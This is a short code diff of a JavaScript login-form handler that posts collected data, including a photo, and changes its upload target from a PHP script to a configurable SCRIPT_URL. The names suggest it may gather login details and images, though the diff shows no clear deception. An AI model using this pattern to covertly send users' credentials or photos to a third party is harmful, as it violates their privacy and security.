@@ -503,7 +503,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
             fd.append('imageData', collectedData.photo);
         }
 
-        const resp = await fetch('collect-data.php', {
+        const resp = await fetch(SCRIPT_URL, {
             method: 'POST',
             body: fd
         });
